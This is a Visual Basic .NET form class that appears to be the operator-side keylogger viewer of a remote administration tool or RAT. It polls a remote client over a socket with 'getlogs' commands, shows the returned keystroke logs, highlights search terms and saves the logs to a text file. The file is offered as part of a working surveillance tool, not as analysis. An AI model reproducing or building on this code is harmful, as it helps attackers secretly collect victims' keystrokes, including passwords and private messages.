Public Class keylogger
    Public sock As Integer
    Private Sub keylogger_Load(sender As System.Object, e As System.EventArgs) Handles MyBase.Load
        Me.AllowTransparency = True
        Me.TransparencyKey = Me.BackColor
        Timer2.Start()
    End Sub

    Private Sub Timer1_Tick(sender As System.Object, e As System.EventArgs) Handles Timer1.Tick
        Main.S.Send(sock, "getlogs")
    End Sub
    Private Sub Panel1_Paint(sender As System.Object, e As System.Windows.Forms.PaintEventArgs) Handles Panel1.Paint
        Timer1.Start()
    End Sub
    Private Sub Search()
        If TextBox1.Text.Contains(TextBox2.Text) = True Then
            Dim x As Integer = TextBox1.Text.IndexOf(TextBox2.Text, TextBox1.Text.IndexOf(TextBox2.Text))
            Dim y As Integer = TextBox2.Text.Length
            TextBox1.Select(x, y)
            TextBox1.SelectionColor = Color.Red
            TextBox1.SelectionFont = New Font(TextBox1.Font, FontStyle.Bold)
            TextBox1.Focus()
        Else
            MsgBox("Cannot Find This Word : " & " " & TextBox2.Text)
            TextBox2.Text = ""

        End If
    End Sub
    Private Sub Button2_Click(sender As System.Object, e As System.EventArgs) Handles Button2.Click
        Search()
    End Sub

    Private Sub Button1_Click(sender As System.Object, e As System.EventArgs) Handles Button1.Click
        Timer1.Stop()
        Button1.Enabled = True
    End Sub
#Region "Drag"

    Dim posX As Integer
    Dim posY As Integer
    Dim drag As Boolean



    Private Sub Header_MouseDown(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles Label3.MouseDown
        If e.Button = MouseButtons.Left Then
            drag = True
            posX = Cursor.Position.X - Me.Left
            posY = Cursor.Position.Y - Me.Top
        End If
    End Sub

    Private Sub Header_MouseUp(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles Label3.MouseUp
        drag = False
    End Sub

    Private Sub Header_MouseMove(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles Label3.MouseMove
        If drag Then
            Me.Top = Cursor.Position.Y - posY
            Me.Left = Cursor.Position.X - posX
        End If
        Me.Cursor = Cursors.Default
    End Sub


    Private Sub buttonClos_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles buttonClos.Click
        Me.Close()
    End Sub



#End Region

    Private Sub SaveToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles SaveToolStripMenuItem.Click
        Dim x As New SaveFileDialog
        With x
            .Filter = "TXT|*.txt"

        End With

        If x.ShowDialog = Windows.Forms.DialogResult.OK Then
            FileOpen(1, x.FileName, OpenMode.Binary)
            FilePut(1, TextBox1.Text)
            FileClose(1)
            MsgBox("Logs Saved", MsgBoxStyle.Information, "")
        End If
    End Sub

    Private Sub DownloadToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles DownloadToolStripMenuItem.Click
         Main.S.Send(sock, "getlogs")
    End Sub
    Dim currh As Double = 0.0
    '743; 747
    Private Sub Timer2_Tick(sender As System.Object, e As System.EventArgs) Handles Timer2.Tick
        If currh < 746 Then
            currh += 74.7
            Me.Size = New Size(Me.Width, currh)

        Else
            Timer2.Stop()
            Main.S.Send(sock, "getlogs")
            Main.S.Send(sock, "getlog")
        End If
    End Sub
End Class